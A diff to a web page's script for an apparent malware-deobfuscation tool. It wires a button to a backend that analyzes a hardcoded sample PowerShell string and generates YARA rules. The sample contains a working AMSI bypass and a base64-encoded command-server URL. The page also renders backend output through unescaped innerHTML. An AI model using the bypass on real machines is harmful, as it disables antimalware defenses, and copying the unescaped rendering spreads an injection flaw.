@@ -375,15 +375,50 @@
 </div>
 </div>
 <script>
-  // Simple micro-interactions for button response states
-  document.getElementById('deobfuscate-btn')?.addEventListener('click', function() {
-    this.classList.add('opacity-75');
-    const originalText = this.innerHTML;
-    this.innerHTML = '<span class="material-symbols-outlined text-[16px] animate-spin">refresh</span><span>Re-evaluating AST...</span>';
-    setTimeout(() => {
-      this.innerHTML = originalText;
-      this.classList.remove('opacity-75');
-    }, 600);
+  // Connect the frontend button to the FastAPI Backend on Render
+  document.getElementById('deobfuscate-btn')?.addEventListener('click', async function() {
+    const btn = this;
+    btn.classList.add('opacity-75');
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '<span class="material-symbols-outlined text-[16px] animate-spin">refresh</span><span>Analyzing via Gemini...</span>';
+    
+    try {
+        const payload = "$k9 = [System.Convert]::FromBase64String('aHR0cHM6Ly9jZG4tdXBkYXRlcy13aW4ub3JnL2dhdGUucGhw'); $rawBytes = [System.Text.Encoding]::ASCII.GetString($k9); $m_ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $f_info = $m_ref.GetField('amsiInitFailed', 'NonPublic,Static'); $f_info.SetValue($null, $True);";
+        
+        const response = await fetch('https://backend-zzyd.onrender.com/analyze', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ script: payload })
+        });
+        
+        if (!response.ok) throw new Error("Backend returned " + response.status);
+        
+        const data = await response.json();
+        
+        // Find the right-side output box (the second code box on the screen)
+        const outputBox = document.querySelectorAll('.bg-surface-container-lowest')[1];
+        if (outputBox) {
+            outputBox.innerHTML = `
+                <div class="text-secondary-fixed mb-space-sm font-bold text-lg">✓ Threat Identified: ${data.threat_name}</div>
+                <div class="text-on-surface mb-space-md border-l-2 border-secondary-fixed pl-space-sm py-1 bg-surface-container/30">${data.intent_explanation}</div>
+                
+                <div class="text-outline-variant font-code-sm mb-space-2xs">// De-obfuscated Output</div>
+                <pre class="text-primary-container whitespace-pre-wrap p-space-sm bg-surface-container/50 rounded mb-space-md font-code-sm">${data.deobfuscated_code}</pre>
+                
+                <div class="text-outline-variant font-code-sm mb-space-2xs">// Auto-Generated YARA Rule</div>
+                <pre class="text-tertiary-fixed-dim whitespace-pre-wrap p-space-sm bg-surface-container/50 rounded font-code-sm">${data.yara_rule}</pre>
+            `;
+        }
+        
+        btn.innerHTML = '<span class="material-symbols-outlined text-[16px]">check</span><span>Analysis Complete</span>';
+        btn.classList.replace('bg-primary-container', 'bg-secondary-container');
+        btn.classList.replace('text-on-primary-container', 'text-on-secondary-container');
+    } catch (err) {
+        alert("Error connecting to backend: " + err.message);
+        btn.innerHTML = originalText;
+    } finally {
+        btn.classList.remove('opacity-75');
+    }
   });
 </script></main></div>
 <script src="navigation.js"></script>
